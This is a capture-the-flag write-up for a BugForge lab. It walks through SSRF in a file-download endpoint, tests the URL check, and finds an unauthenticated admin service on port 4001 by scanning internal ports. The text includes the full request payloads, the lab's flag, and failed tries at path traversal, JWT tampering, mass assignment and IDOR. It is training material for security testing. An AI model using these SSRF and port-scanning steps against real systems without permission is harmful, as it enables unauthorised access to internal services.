---
title: HackersParadise - SSRF
tags:
  - bugforge
  - ssrf
  - port-scanning
  - internal-service
  - caido-mcp
---

- SSRF via a LimeWire file download feature, pivoting to an undocumented internal admin service on a different port
- The lesson: when you find SSRF, enumerate ports immediately. Don't tunnel vision on the one port you already know about.
- **Difficulty:** Medium
- **Theme:** 90s HackersParadise underground mall (Matrix/retro hacker aesthetic)

## TL;DR

SSRF in `/api/limewire/download` (`torrent_url` field) allows fetching from internal services. URL validation only checks hostname (`localhost`) but doesn't restrict ports. Port 4001 hosts an admin service with the flag at `/admin/flag.txt`.

**Attack Chain:**
```
Read JS files -> discover torrent_url points to localhost:4000 -> confirm SSRF -> enumerate ports -> find admin service on 4001 -> /admin/flag.txt -> flag
```

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Reading the JS Files](#2-reading-the-js-files)
3. [SSRF Confirmation](#3-ssrf-confirmation)
4. [Port Enumeration - The Key Step](#4-port-enumeration--the-key-step)
5. [Flag](#5-flag)
6. [Dead Ends - What Didn't Work](#6-dead-ends--what-didnt-work)
7. [What I Should Have Done Differently](#7-what-i-should-have-done-differently)

---

## 1. Reconnaissance

### App Overview

The app is a 90s-themed underground shop called "HackersParadise" running on Express.js (hybrid SSR + static HTML pages). Features:

- Shopping (products paid via "calling cards")
- LimeWire-style file sharing/download
- Guestbook
- Profile management
- Admin console (RedPill) -> role-gated

### Initial Discovery

`pentest-init-flow` finds 3 API endpoints and 2 JS files:

```
API ENDPOINTS:
  /api/auth/me [GET]
  /api/orders [POST]
  /api/products [GET]

JS FILES:
  /js/app.js
  /js/shop.js
```

But by crawling the HTML pages, many more JS files surface:

| File | Referenced from |
|------|----------------|
| `/js/app.js` | Every page (nav, cart, footer) |
| `/js/shop.js` | index.html (product grid) |
| `/js/auth.js` | login.html |
| `/js/register.js` | register.html |
| `/js/profile.js` | profile.html |
| `/js/guestbook.js` | guestbook.html |
| `/js/limewire.js` | limewire.html |
| `/js/redpillconsole.js` | redpillconsole.html |

---

## 2. Reading the JS Files

### Key Finding #1: Role System (app.js)

```javascript
// app.js - line 766
if (user && user.role === 'redpill') {
    const rpBtn = document.createElement('a');
    rpBtn.href = '/redpillconsole.html';
    rpBtn.textContent = '💊 RedPill';
    nav.appendChild(rpBtn);
}
```

The admin role is `redpill`. Normal users get `bluepill`.

### Key Finding #2: SSRF Vector (limewire.js)

```javascript
// limewire.js - triggerDownload function
async function triggerDownload(file) {
    const token = localStorage.getItem('token');
    const res = await fetch('/api/limewire/download', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer ' + token
        },
        body: JSON.stringify({ torrent_url: file.torrent_url })
    });
    return res.json();
}
```

The download endpoint takes a `torrent_url` and makes a server-side fetch. Checking the file listing:

```json
GET /api/limewire/files

{
  "files": [
    {
      "filename": "The_Matrix_1999_DVDRip.avi",
      "torrent_url": "http://localhost:4000/torrent/download/The_Matrix_1999_DVDRip.avi"
    },
    ...
  ]
}
```

The `torrent_url` points to `http://localhost:4000/...` -> an internal service.

### Key Finding #3: Admin API Endpoints (redpillconsole.js)

```javascript
// redpillconsole.js
async function loadStats() {
    const data = await apiFetch('/api/redpillconsole/stats');
}
async function loadUsers() {
    const data = await apiFetch('/api/redpillconsole/users');
}
async function loadOrders() {
    const data = await apiFetch('/api/redpillconsole/orders');
}
```

These require `redpill` role server-side (confirmed: returns 403 with a bluepill token).

### Key Finding #4: Additional API Endpoints

- `/api/auth/login` (auth.js)
- `/api/auth/register` (register.js)
- `/api/auth/change-password` (profile.js)
- `/api/guestbook` GET/POST (guestbook.js)
- `/api/limewire/files` (limewire.js)
- `/api/limewire/download` (limewire.js) -- the SSRF vector

---

## 3. SSRF Confirmation

### Testing the SSRF

```http
POST /api/limewire/download HTTP/1.1
Host: <LAB>
Authorization: Bearer <TOKEN>
Content-Type: application/json

{"torrent_url":"http://localhost:4000/"}
```

Response:
```json
{
  "success": true,
  "data": {
    "status": "online",
    "endpoints": ["/torrent", "/redpillconsole", "/rabbithole"]
  }
}
```

SSRF confirmed. The server fetches from `localhost:4000` and returns the JSON response.

### URL Validation

The endpoint validates the URL:
- `http://localhost:3000/...` -- "Invalid service URL" (400)
- `http://127.0.0.1:3000/...` -- "Invalid service URL" (400)
- `http://localhost:4000/...` -- Works (200)
- `http://localhost:4001/...` -- Works (200) **<-- The bypass**

The validation checks that the host is `localhost` but does NOT restrict the port to 4000 only.

---

## 4. Port Enumeration - The Key Step

The validator allows any localhost port - just not non-localhost hosts.

```http
POST /api/limewire/download HTTP/1.1
Host: <LAB>
Authorization: Bearer <TOKEN>
Content-Type: application/json

{"torrent_url":"http://localhost:4001/"}
```

Response:
```json
{
  "success": true,
  "data": {
    "status": "online",
    "clearence-level": "admin"
  }
}
```

Port 4001 has an admin service with no authentication!

### Enumerating Port 4001

```http
{"torrent_url":"http://localhost:4001/admin/flag"}
```
Response: `{"error":"You're so close"}`

```http
{"torrent_url":"http://localhost:4001/admin/flag.txt"}
```
Response:
```json
{
  "success": true,
  "data": {
    "flag": "bug{W59H9EumcpmN3F2aL2iNixQWV3X8ooGe}"
  }
}
```

---

## 5. Flag

```
bug{W59H9EumcpmN3F2aL2iNixQWV3X8ooGe}
```

---

## 6. Dead Ends - What Didn't Work

These are rabbit holes I spent time on before finding port 4001:

### Port 4000 Internal Endpoints

| Path | Response |
|------|----------|
| `/redpillconsole` | endpoints: /stats, /users, /orders |
| `/redpillconsole/stats` | "Not Authorized" |
| `/redpillconsole/orders` | "Not Authorized" |
| `/redpillconsole/users` | endpoints: /:id/password |
| `/redpillconsole/users/1/password` | "Really? Password for 1?" (taunt) |
| `/rabbithole` | "How deep does the rabbit hole go?" (taunt) |
| `/rabbithole/secret` | "Endpoint not available" |
| `/rabbithole/flag` | "Endpoint not available" |

All rabbit holes. Port 4000's redpillconsole endpoints require auth that can't be bypassed via SSRF.

### Path Traversal on Torrent Download

```
http://localhost:4000/torrent/download/..%2F..%2Fserver.js
```

Returns "File not found" -> the traversal works (URL encoding bypasses the router) but there's no file at that path. I tried dozens of filenames. None existed.

### JWT Attacks

- `alg:none` -- rejected (401)
- Common secrets (secret, password, 123456, hackersparadise, redpill, matrix) -- all rejected

### Mass Assignment on Register

```json
POST /api/auth/register
{"username":"test","password":"test","role":"redpill"}
```

Role ignored -- always assigns `bluepill`.

### Change-Password IDOR

```json
POST /api/auth/change-password
{"newPassword":"x","id":1}
```

Always says "Password updated" but only changes the requesting user's password. Extra fields ignored.

---

## 7. What I Should Have Done Differently

### The Failure

I found the SSRF in under 2 minutes. I then spent 40+ minutes exclusively hammering port 4000 - path traversal, rabbit hole endpoints, redpillconsole auth bypass, JWT tampering... all dead ends.

The fix was trivial: **try other ports.**

### SSRF Port Scanning Should Be Step 1

When you confirm SSRF to an internal service, the very next thing to test is:

1. **What other ports are reachable?** (4001, 4002, 5000, 8080, 9000...)
2. What validation is actually enforced? (host only? host+port? path prefix?)
3. Are redirects followed?

I confirmed the URL check rejected `localhost:3000` (400) but never tested `localhost:4001`. That's a 1-request test that would have solved the lab immediately.

### Rule for Future

After confirming SSRF with URL validation:
1. Test what's actually validated (host? port? scheme? path?)
2. Test adjacent ports (port +/- 1, common service ports)
3. Don't spend more than 5 minutes on one port before checking others
